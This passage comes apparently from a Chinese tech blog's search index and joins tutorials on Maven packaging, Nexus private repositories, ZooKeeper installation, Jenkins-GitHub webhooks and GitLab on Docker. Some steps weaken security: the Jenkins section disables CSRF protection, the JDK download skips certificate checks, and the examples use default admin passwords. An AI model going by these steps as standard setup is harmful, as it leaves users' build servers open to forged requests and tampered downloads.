默认中央仓库的 id 为 central。其中 id 是唯一的，因此使用 &lt;id&gt;central&lt;/id&gt; 就可以覆盖默认的中央仓库 Maven 打包跳过测试用例 使用命令 mvn install -DskipTests，不执行测试用例，但会编译测试用例类的代码 使用命令 mvn install -Dmaven.test.skip=true，不但跳过单元测试的运行，也跳过单元测试代码的编译 使用 Maven 插件的配置如下： 123456789&lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt; &lt;version&gt;2.5&lt;/version&gt; &lt;configuration&gt; &lt;skipTests&gt;true&lt;/skipTests&gt; &lt;!-- &lt;skip&gt;true&lt;/skip&gt; --&gt; &lt;/configuration&gt;&lt;/plugin&gt; Maven 指定编译的 JDK 版本方式一 1234&lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt;&lt;/properties&gt; 方法二 123456789&lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;version&gt;3.8.1&lt;/version&gt; &lt;configuration&gt; &lt;source&gt;1.8&lt;/source&gt; &lt;target&gt;1.8&lt;/target&gt; &lt;/configuration&gt;&lt;/plugin&gt; 方法三 该方式并非 Maven 官方配置，要使该方式能够生效首先必须满足以下两个条件： 项目为一个 SpringBoot 工程 项目的 POM 继承了 spring-boot-starter-parent 123456789&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt;&lt;/properties&gt; Maven 引入本地 Jar 包方法一（推荐） 通过 mvn install 命令手动将 Jar 包安装到 Maven 本地仓库（如下），相关资料可参考这里 1$ mvn install:install-file -Dfile=taobao-sdk-java-auto.jar -DgroupId=com.dingtalk -DartifactId=dingtalk-api-sdk -Dversion=1.0.0-SNAPSHOT -Dpackaging=jar 最后在 pom.xml 里正常引入对应的依赖即可： 12345&lt;dependency&gt; &lt;groupId&gt;com.dingtalk&lt;/groupId&gt; &lt;artifactId&gt;dingtalk-api-sdk&lt;/artifactId&gt; &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt;&lt;/dependency&gt; 若需要从本地仓库卸载特定的本地 Jar 包，可以在 pom.xml 所在目录下执行以下命令，其中 -DmanualInclude 的参数格式为 groupId:artifactId 12345# 从Maven本地仓库卸载某个Jar包$ mvn dependency:purge-local-repository -DmanualInclude="com.dingtalk:dingtalk-api-sdk"# 阻止Maven对已删除的Jar包进行ReResolve$ mvn dependency:purge-local-repository -DreResolve=false 方法二（推荐） 通过 Maven 插件将本地 Jar 包安装到 Maven 本地仓库（如下），值得一提的是，需要手动执行 mvn clean &amp;&amp; mvn install 命令将本地 Jar 包安装到 Maven 本地仓库，相关资料可参考这里 123456789101112131415161718192021222324252627&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-install-plugin&lt;/artifactId&gt; &lt;version&gt;2.5.2&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;install-external&lt;/id&gt; &lt;phase&gt;clean&lt;/phase&gt; &lt;configuration&gt; &lt;file&gt;${project.basedir}/lib/taobao-sdk-java-auto.jar&lt;/file&gt; &lt;repositoryLayout&gt;default&lt;/repositoryLayout&gt; &lt;groupId&gt;com.dingtalk&lt;/groupId&gt; &lt;artifactId&gt;dingtalk-api-sdk&lt;/artifactId&gt; &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt; &lt;packaging&gt;jar&lt;/packaging&gt; &lt;generatePom&gt;true&lt;/generatePom&gt; &lt;/configuration&gt; &lt;goals&gt; &lt;goal&gt;install-file&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 最后在 pom.xml 里正常引入对应的依赖即可： 12345&lt;dependency&gt; &lt;groupId&gt;com.dingtalk&lt;/groupId&gt; &lt;artifactId&gt;dingtalk-api-sdk&lt;/artifactId&gt; &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt;&lt;/dependency&gt; 方法三（不推荐） 假设项目的目录结构如下： 12345market├── common-api│&nbsp;&nbsp; └── lib│&nbsp;&nbsp; └── taobao-sdk-java-auto.jar└── common-cache 在 common-api 模块下的 pom.xml 添加以下依赖来引入本地 Jar 包： groupId：自定义 artifactId：自定义 version：自定义 scope：必须是 system systemPath：Jar 包的路径，${project.basedir} 是指当前 pom.xml 所在的目录 1234567&lt;dependency&gt; &lt;groupId&gt;com.dingtalk&lt;/groupId&gt; &lt;artifactId&gt;dingtalk-api-sdk&lt;/artifactId&gt; &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt; &lt;scope&gt;system&lt;/scope&gt; &lt;systemPath&gt;${project.basedir}/lib/taobao-sdk-java-auto.jar&lt;/systemPath&gt;&lt;/dependency&gt; 若 common-api 模块是普通 Maven 项目，那么打包时需要添加以下配置，目的是将本地 Jar 包同时打包在一起： directory：指定 lib 文件夹的位置，一般直接写上 ${project.basedir}/lib 即可 targetPath：打包到的文件夹位置，写上 BOOT-INF/lib 即可，或者是 WEB-INF/lib includes：一般都是以 .jar 结尾，直接写 **/*.jar 即可 123456789101112131415161718&lt;build&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;${project.basedir}/lib&lt;/directory&gt; &lt;targetPath&gt;/BOOT-INF/lib/&lt;/targetPath&gt; &lt;includes&gt; &lt;include&gt;**/*.jar&lt;/include&gt; &lt;/includes&gt; &lt;/resource&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;filtering&gt;true&lt;/filtering&gt; &lt;includes&gt; &lt;include&gt;**/*.*&lt;/include&gt; &lt;/includes&gt; &lt;/resource&gt; &lt;/resources&gt;&lt;/build&gt; 若 common-api 模块是 SpringBoot 项目，那么打包时需要添加以下配置，目的是将本地 Jar 包同时打包在一起： 1234567891011&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;includeSystemScope&gt;true&lt;/includeSystemScope&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; Maven 单元测试拷贝资源文件@SpringBootTest 注解，只会加载 src/test 路径下的资源文件（如 XML 配置），并不会加载 src/main 路径下的资源文件。若需要在执行单元测试时，加载 src/main 路径下的资源文件，需要让 Maven 拷贝对应的资源文件到 src/test 路径下： 1234567891011121314151617181920&lt;build&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;filtering&gt;true&lt;/filtering&gt; &lt;includes&gt; &lt;include&gt;**/*.*&lt;/include&gt; &lt;/includes&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;!--单元测试时引用src/main/resources下的资源文件--&gt; &lt;testResources&gt; &lt;testResource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;/testResource&gt; &lt;testResource&gt; &lt;directory&gt;src/test/resources&lt;/directory&gt; &lt;/testResource&gt; &lt;/testResources&gt;&lt;/build&gt; 有时候开发一个公共 Jar 包给别人引用，当别人打开包中的类的时候，默认情况下打开的是 IDE 工具反编译出来的 .class 文件，类中的注释什么的都看不到，此时 IDE 工具会提示可以 Download Sources，但是如果打包的时候没有同时打一个以 -sources.jar 结尾的源码 Jar 包，那么调用方下载源码包的时候就会失败。maven-source 插件就是用来打包源码的，可以部署到私有仓库上的，对于需要查看源码、注释和调试代码，有很大的帮助。 123456789101112&lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-source-plugin&lt;/artifactId&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;attach-sources&lt;/id&gt; &lt;goals&gt; &lt;goal&gt;jar&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt;&lt;/plugin&gt; Mave 将所有依赖包打包在单个 Jar 包若 Maven 打包时，需要将项目源码与所有依赖包一起打包在单个 Jar 文件中，可以参考以下配置： 12345678910111213141516171819202122&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt; &lt;version&gt;3.0.0&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;single&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;configuration&gt; &lt;descriptorRefs&gt; &lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt; &lt;/descriptorRefs&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; Maven 将项目中的测试代码打包进 Jar 包 Maven 支持打包的插件列表如下： plugin function maven-jar-plugin maven 默认打包插件，用来创建 project jar maven-shade-plugin 用来打可执行包，executable (fat) jar maven-assembly-plugin 支持定制化打包方式，例如 apache 项目的打包方式 添加 maven-assembly-plugin 插件： 1234567891011121314151617&lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt; &lt;version&gt;3.0.0&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;assembly&lt;/id&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;single&lt;/goal&gt; &lt;/goals&gt; &lt;configuration&gt; &lt;descriptors&gt;src/main/resources/assembly.xml&lt;/descriptors&gt; &lt;/configuration&gt; &lt;/execution&gt; &lt;/executions&gt;&lt;/plugin&gt; 还可以在上面的 configuration 节点中指定执行 Jar 包时的 Test 主类： 12345678&lt;configuration&gt; &lt;descriptors&gt;src/main/resources/assembly.xml&lt;/descriptors&gt; &lt;archive&gt; &lt;manifest&gt; &lt;mainClass&gt;com.sample.TestMain&lt;/mainClass&gt; &lt;/manifest&gt; &lt;/archive&gt;&lt;/configuration&gt; 创建 assembly.xml 配置文件： 123456789101112131415161718192021222324252627282930313233&lt;assembly xmlns="http://maven.apache.org/plugins/maven-assembly-plugin/assembly/1.1.3" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/plugins/maven-assembly-plugin/assembly/1.1.3 http://maven.apache.org/xsd/assembly-1.1.3.xsd"&gt; &lt;id&gt;assembly&lt;/id&gt; &lt;formats&gt; &lt;format&gt;jar&lt;/format&gt; &lt;/formats&gt; &lt;includeBaseDirectory&gt;false&lt;/includeBaseDirectory&gt; &lt;dependencySets&gt; &lt;dependencySet&gt; &lt;outputDirectory&gt;/&lt;/outputDirectory&gt; &lt;useProjectArtifact&gt;true&lt;/useProjectArtifact&gt; &lt;unpack&gt;true&lt;/unpack&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependencySet&gt; &lt;/dependencySets&gt; &lt;fileSets&gt; &lt;fileSet&gt; &lt;directory&gt;${project.build.directory}/test-classes&lt;/directory&gt; &lt;outputDirectory&gt;/&lt;/outputDirectory&gt; &lt;includes&gt; &lt;include&gt;**/*.class&lt;/include&gt; &lt;/includes&gt; &lt;useDefaultExcludes&gt;true&lt;/useDefaultExcludes&gt; &lt;/fileSet&gt; &lt;/fileSets&gt;&lt;/assembly&gt; 特别注意：上面 assembly.xml 里的配置，默认会将所有 Jar 包的源码一起打包（包括依赖的第三方 Jar 包），如果只希望打包项目自身的源码，那么则需要添加 exclude 节点来排除依赖： 123456789101112131415161718192021222324252627282930313233343536373839&lt;assembly xmlns="http://maven.apache.org/plugins/maven-assembly-plugin/assembly/1.1.3" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/plugins/maven-assembly-plugin/assembly/1.1.3 http://maven.apache.org/xsd/assembly-1.1.3.xsd"&gt; &lt;id&gt;assembly&lt;/id&gt; &lt;formats&gt; &lt;format&gt;jar&lt;/format&gt; &lt;/formats&gt; &lt;includeBaseDirectory&gt;false&lt;/includeBaseDirectory&gt; &lt;dependencySets&gt; &lt;dependencySet&gt; &lt;outputDirectory&gt;/&lt;/outputDirectory&gt; &lt;useProjectArtifact&gt;true&lt;/useProjectArtifact&gt; &lt;unpack&gt;true&lt;/unpack&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;excludes&gt; &lt;exclude&gt;org.slf4j:slf4j-api&lt;/exclude&gt; &lt;exclude&gt;com.fasterxml.jackson.core:*&lt;/exclude&gt; &lt;exclude&gt;org.apache.httpcomponents:*&lt;/exclude&gt; &lt;exclude&gt;com.google.guava:guava&lt;/exclude&gt; &lt;/excludes&gt; &lt;/dependencySet&gt; &lt;/dependencySets&gt; &lt;fileSets&gt; &lt;fileSet&gt; &lt;directory&gt;${project.build.directory}/test-classes&lt;/directory&gt; &lt;outputDirectory&gt;/&lt;/outputDirectory&gt; &lt;includes&gt; &lt;include&gt;**/*.class&lt;/include&gt; &lt;/includes&gt; &lt;useDefaultExcludes&gt;true&lt;/useDefaultExcludes&gt; &lt;/fileSet&gt; &lt;/fileSets&gt;&lt;/assembly&gt; 运行以下打包命令，会生成 xxxx-1.0.0-SNAPSHOT-assembly.jar 文件，其中文件名里的 assembly 是由 assembly.xml 配置文件里的 id 节点指定： 1$ mvn package Maven 私有仓库配置通过插件上传 Jar 包到私有仓库编辑 Maven 的 settings.xml 配置文件，通过添加 server 节点来配置私有仓库的账号和密码，这里的 id 可以随便取名字，但必须与下面配置的 id 一致： 1234567891011&lt;server&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;admin123&lt;/password&gt;&lt;/server&gt;&lt;server&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;admin123&lt;/password&gt;&lt;/server&gt; 编辑 Maven 的 settings.xml 配置文件，通过添加 mirror 节点来配置私有仓库的地址，这里的 id 必须和上面 server 节点的 id 一致： 12345678910111213&lt;mirror&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;mirrorOf&gt;*&lt;/mirrorOf&gt; &lt;name&gt;nexus maven releases repo&lt;/name&gt; &lt;url&gt;http://127.0.0.1:8081/nexus/content/repositories/releases/&lt;/url&gt;&lt;/mirror&gt;&lt;mirror&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;mirrorOf&gt;*&lt;/mirrorOf&gt; &lt;name&gt;nexus maven snapshots repo&lt;/name&gt; &lt;url&gt;http://127.0.0.1:8081/nexus/content/repositories/snapshots/&lt;/url&gt;&lt;/mirror&gt; 编辑项目的 pom.xml 文件，添加以下内容，这里的 id 必须与 上面 mirror 节点里的 id 一致： 1234567891011121314&lt;distributionManagement&gt; &lt;repository&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;name&gt;Nexus Snapshots Repository&lt;/name&gt; &lt;url&gt;http://127.0.0.1:8081/nexus/content/repositories/snapshots/&lt;/url&gt; &lt;/repository&gt; &lt;!-- &lt;repository&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;name&gt;Nexus Releases Repository&lt;/name&gt; &lt;url&gt;http://127.0.0.1:8081/nexus/content/repositories/releases/&lt;/url&gt; &lt;/repository&gt; --&gt;&lt;/distributionManagement&gt; 执行发布命令： 1$ maven clean deploy Maven 常见问题解决上传 Jar 包到私有仓库出现 400 错误码一般有 3 个导致出现上面问题的原因： 一、pom.xml 中仓库 id 配置不对，检查 pom.xml 中配置的 distributionManagement 中的仓库 id、url 和私服 Nexus 中的是否相同 1234567&lt;distributionManagement&gt; &lt;repository&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;name&gt;Nexus Snapshots Repository&lt;/name&gt; &lt;url&gt;http://127.0.0.1:8081/nexus/content/repositories/snapshots/&lt;/url&gt; &lt;/repository&gt;&lt;/distributionManagement&gt; 二、私服 Nexus 已经存在相同版本且代码完全一样的 Jar 包，同时部署策略为不允许覆盖；此时只需要将仓库对应的 Deployment Policy 设置为 Allow Redeploy 即可 三、如果 Repository Policy 为 Release，则部署 Jar 包的版本号中不允许出现 snapshot 关键字；特别注意，Repository Policy 有两个选项，一个发布版本，一个是快照版本，要和部署 Jar 包的版本号完全对应 上传 Jar 包到私有仓库出现 401 错误码一般报 401 这个错误码，是因为没有发布权限，而没发布权限的原因，大部分都是因为密码错了导致，或者账号本身就没有发布 Jar 包的权限。如果是密码错误，则可以编辑 Maven 的 settings.xml 配置文件，通过添加 server 节点来配置私有仓库的账号和密码： 1234567891011&lt;server&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;admin123&lt;/password&gt;&lt;/server&gt;&lt;server&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;admin123&lt;/password&gt;&lt;/server&gt; 如果密码正确，账号本身也具有发布 Jar 包的权限，但依然提示 401 错误，那么此时应该检查当前生效的 settings.xml 配置文件是哪个，查询命令如下： 12345$ mvn -X[DEBUG] Reading global settings from /usr/develop/maven-3.6.0/conf/settings.xml[DEBUG] Reading user settings from /root/.m2/settings.xml[DEBUG] Reading global toolchains from /usr/develop/maven-3.6.0/conf/toolchains.xml[DEBUG] Reading user toolchains from /root/.m2/toolchains.xml 如果上面输出的 global settings 指向的配置文件不是所期望的，此时就应该注意了，可以使用以下命令进一步查看正在起作用的那个 settings.xml 的内容： 1$ mvn help:effective-settings Nexus 常见问题解决指定 Nexus 使用的 JDK 版本 Nexus Version Supported Sun/Oracle JRE version 1.9 and earlier 5 or 6 2.0-2.5 6 or 7 2.6.x 7u45+, only 8+ will not work 2.7.x-2.9.x 7u45+, 8+ may work but is not thoroughly tested 2.10.x-2.11.1 7u45+, 8u25+ 2.11.2+ 8u31+ strongly recommended, 7u79+ no further public updates as of April 2015 2.12.0-01 8u31+ strongly recommended, 11.0.9 not work 由于以前安装的 Nexus 版本为 2.12.0-01，JDK 版本为 8，后来 JDK 升级为 11 后，Nexus 无法启动，因此只能指定 Nexus 默认使用 JDK 8，方法如下： 123456789101112131415# 进入配置文件所在的目录$ cd nexus/nexus-2.12.0-01/bin/jsw/conf# 备份配置文件$ cp wrapper.conf wrapper.conf.default# 编辑配置文件，指定JDK的安装路径$ vim wrapper.confwrapper.java.command=/usr/java/jdk1.8.0_102/bin/java# 重启Nexus服务$ service nexus restart# 查看Nexus服务的运行状态$ service nexus status var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"java 开发随笔"},{title:"Linux 安装 ZooKeeper 单机实例",url:"/posts/6edb1958.html",text:'前言 本文适用于 Centos/Debian/Ubuntu 等 Linux 发行版系统。 安装 Oracle JDK 安装 Oracle JDK 不是必需的，如果不想安装可以使用 Open-JDK 替代，而且大多数 Linux 发行版自带 Open-JDK。 1234567891011121314151617181920212223242526272829303132# 下载Oracle JDK8# wget -P /usr/local --no-cookies --no-check-certificate --header "Cookie: gpw_e24=http%3a%2F%2Fwww.oracle.com%2Ftechnetwork%2Fjava%2Fjavase%2Fdownloads%2Fjdk8-downloads-2133151.html; oraclelicense=accept-securebackup-cookie;" "https://download.oracle.com/otn-pub/java/jdk/8u201-b09/42970487e3af4f5aa5bca3f542482c60/jdk1.8.0_201-linux-x64.tar.gz"# 解压Oracle JDK8# tar -xvf /usr/local/jdk1.8.0_201-linux-x64.tar.gz# 删除下载文件# rm /usr/local/jdk1.8.0_201-linux-x64.tar.gz# 如果已安装Open-JDK，则覆盖Java命令的软链接# ln -s -f /usr/local/jdk1.8.0_201/bin/java /usr/bin/java# ln -s -f /usr/local/jdk1.8.0_201/bin/javac /usr/bin/javac# 配置JDK的环境变量，在配置文件末尾追加以下内容即可# vim /etc/profileJAVA_HOME=/usr/local/jdk1.8.0_201JRE_HOME=/usr/local/jdk1.8.0_201/jreCLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/libPATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/binexport JAVA_HOME JRE_HOME CLASSPATH PATH# 使环境变量生效# source /etc/profile# 验证环境变量是否生效，如果不生效建议重启系统# javac -versionjavac 1.8.0_201# java -versionjava version "1.8.0_201"Java(TM) SE Runtime Environment (build 1.8.0_201-b09)Java HotSpot(TM) 64-Bit Server VM (build 25.201-b09, mixed mode) 下载 ZooKeeper 压缩包 ZooKeeper 官方下载地址 安装 ZooKeeper 12345678910111213141516171819202122232425262728293031323334353637383940# 移动下载文件到/usr/local目录# mv zookeeper-3.4.13.tar.gz /usr/local# 解压下载文件# cd /usr/local# tar -xvf zookeeper-3.4.13.tar.gz# 删除下载文件# rm -rf zookeeper-3.4.13.tar.gz# 创建ZooKeeper的数据目录与日志目录# mkdir -p /usr/local/zookeeper-3.4.13/data# mkdir -p /usr/local/zookeeper-3.4.13/log# 创建配置文件# cd /usr/local/zookeeper-3.4.13/conf# cp zoo_sample.cfg zoo.cfg# 修改ZooKeeper的默认配置# vim zoo.cfg# 定义的基准时间间隔，单位：毫秒tickTime=2000# 默认端口clientPort=2181# 数据文件夹dataDir=/usr/local/zookeeper-3.4.13/data# 修改ZooKeeper的日志配置# vim log4j.properties# 日志文件夹zookeeper.log.dir=/usr/local/zookeeper-3.4.13/log# 配置环境变量# vim /etc/profileZOOKEEPER_HOME=/usr/local/zookeeper-3.4.13PATH=$PATH:ZOOKEEPER_HOME/binexport ZOOKEEPER_HOME PATH# 使环境变量生效# source /etc/profile ZooKeeper 服务管理 1234567891011121314151617# 进入ZooKeeper的bin目录# cd /usr/local/zookeeper-3.4.13/bin# 停止服务# ./zkServer.sh stop# 后台启动服务# ./zkServer.sh start# 前台启动服务# ./zkServer.sh start-foreground# 查看服务的运行状态# ./zkServer.sh status# 重启服务# ./zkServer.sh restart 客户端连接 ZooKeeper 服务器端 123456789101112131415161718192021222324252627282930# 进入ZooKeeper的bin目录$ cd /usr/local/zookeeper-3.4.13/bin# 客户端连接ZooKeeper服务器端$ ./zkCli.sh -server 127.0.0.1:2181# 创建节点[zk: 127.0.0.1:2181(CONNECTED) 1] create -e /test-node 123456# 列出所有根节点[zk: 127.0.0.1:2181(CONNECTED) 2] ls /[test-node, zookeeper]# 获取指定节点的值[zk: 127.0.0.1:2181(CONNECTED) 3] get /test-node123456cZxid = 0x4ctime = Fri Feb 22 02:27:43 UTC 2019mZxid = 0x4mtime = Fri Feb 22 02:27:43 UTC 2019pZxid = 0x4cversion = 0dataVersion = 0aclVersion = 0ephemeralOwner = 0x1000a766c5e0001dataLength = 6numChildren = 0# 断开客户端连接[zk: 127.0.0.1:2181(CONNECTED) 4] quit var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux"},{title:"Jenkins 入门教程之四 Jenkins 与 Git 持续集成实战",url:"/posts/c7372b8f.html",text:'上篇：Jenkins 入门教程之三 Jenkins 与 SVN 持续集成实战 Jenkins+GitHub 持续集成环境的搭建，与 Jenkins+SVN 持续集成环境的搭建很相似，下面只简单介绍 Jenkins+GitHub 的重点内容，额外的操作可参考上一篇文章。 Jenkins+GitHub 持续集成环境搭建要点 Jenkins 需要部署到外网上，因为内网地址 GitHub 是无法访问到的，可以租用阿里云等云服务平台 Jenkins 所在的主机上需要安装 Git，通过 Git 程序从 GitHub 上 clone 代码 在 Jenkins 内需要指定 Git 程序位置，和指定 JDK、Maven 的位置类似 在 GitHub 上使用 repository 的 WebHook 方式远程触发 Jenkins 构建 在 Jenkins 内关闭 “防止跨站点请求伪造” Jenkins 配置 Git 程序的位置 构建任务中配置 Github 仓库的地址 Jenkins 关闭” 防止跨站点请求伪造” 找到”Manage Jenkins” -&gt; “Configure Global Security” -&gt; “CSRF Protection”，取消勾选 “防止跨站点请求伪造”，然后保存设置。 Github 配置 Webhooks Github 配置 Webhooks 的目的是当 Git 客户端 Push 代码到 Github 仓库后，通知 Jenkins Clone 最新的代码到本地并进行构建发布。如果使用 Gitolite 搭建 Git 服务器，可以在 Git 仓库目录下的 hooks/post-update 钩子脚本中添加远程触发 Jenkins 构建的 CURL 命令。下面填写的 URL 是远程触发 Jenkins 构建的请求地址，将”example.com” 替换为 Jenkins 所在主机的外网 IP 或者域名，参数 token 的值是 API Token。关于如何配置远程触发 Jenkins 构建，详细步骤可参考看上一篇文章。完整的 URL 示例如下：http://example.com/jenkins/job/jenkins-study/build?token=yOEBc7Dcd4duKSNt 验证 Github 的 Webhooks 是否正常工作 本地修改项目代码，然后 Push 到 Github 远程仓库，观察 Jenkins 构建任务页面左边的小窗口（构建历史）内是否有新构建历史出现，如果有则说明 Webhooks 正常工作。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"ci/cd"},{title:"Git 之九 - Docker 搭建 Gitlab 服务器",url:"/posts/ec27dc79.html",text:"前言 Docker 环境下官方提供三种方式安装 Gitlab，第一种是基于 Docker 引擎安装，第二种是集群环境下安装，第三种是通过 Docker-Compose 安装。本文将介绍如何通过 Docker-Compose 安装 Gitlab，如果需要 Docker 官方安装 Gitlab 的教程，可点击这里。 安装 Docker 站内教程：Docker 之一 Docker 介绍与安装 安装 Docker-Compose 站内教程：Docker 之十七 Docker-Compose 安装与使用 Gitlab 数据卷挂载介绍 创建 Docker-Compose 配置文件，使用默认端口 1234567891011121314151617181920# 创建目录# mkidr -p /usr/local/gitlab# 创建docker-compose.yml配置文件# vim /usr/local/gitlab/docker-compose.ymlweb: image: 'gitlab/gitlab-ce:latest' restart: always hostname: 'gitlab.example.com' environment: GITLAB_OMNIBUS_CONFIG: | external_url 'https://gitlab.example.com' ports: - '80:80' - '443:443' - '22:22' volumes: - '/srv/gitlab/config:/etc/gitlab' - '/srv/gitlab/logs:/var/log/gitlab' - '/srv/gitlab/data:/var/opt/gitlab' 创建 Docker-Compose 配置文件，在 Docker 容器内使用自定义端口 12345678910111213141516171819202122# 创建目录# mkidr -p /usr/local/gitlab# 创建docker-compose.yml配置文件，在Docker容器内使用自定义端口# 此处重点是在Docker容器内使用自定义端口，而非简单修改Docker容器的端口映射# vim /usr/local/gitlab/docker-compose.ymlweb: image: 'gitlab/gitlab-ce:latest' restart: always hostname: 'gitlab.example.com' environment: GITLAB_OMNIBUS_CONFIG: | nginx['listen_port'] = 9090 external_url 'http://gitlab.example.com:9090' gitlab_rails['gitlab_shell_ssh_port'] = 2224 ports: - '9090:9090' - '2224:2224' volumes: - '/srv/gitlab/config:/etc/gitlab' - '/srv/gitlab/logs:/var/log/gitlab' - '/srv/gitlab/data:/var/opt/gitlab' Docker-Compose 安装 Gitlab 12345678910111213# 进入配置文件docker-compose.yml所在的目录# cd /usr/local/gitlab# 拉取最新的Gitlab镜像# docker-compose pull# 创建并启动Gitlab容器# docker-compose up -d# 查看Gitlab容器的运行情况（使用在Docker容器内指定自定义端口的docker-compose配置）# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES23a12382baff gitlab/gitlab-ce:latest \"/assets/wrapper\" 4 minutes ago Up 4 minutes (healthy) 22/tcp, 80/tcp, 0.0.0.0:2224-&gt;2224/tcp, 443/tcp, 0.0.0.0:9090-&gt;9090/tcp gitlab_web_1 测试访问 Gitlab 启动 Gitlab 容器后，稍等三四分钟然后在浏览器输入以下地址访问 Gitlab 的 Web 页面： http://127.0.0.1 或者 http://127.0.0.1:9090 安装后配置 Gitlab 123456789101112131415161718# 进入配置文件docker-compose.yml所在的目录# cd /usr/local/gitlab# 编辑docker-compose的配置文件，添加相关配置# vim docker-compose.ymlenvironment: GITLAB_OMNIBUS_CONFIG: | nginx['listen_port'] = 9090 ....（省略）# 停止Giblab容器# docker-compose stop# 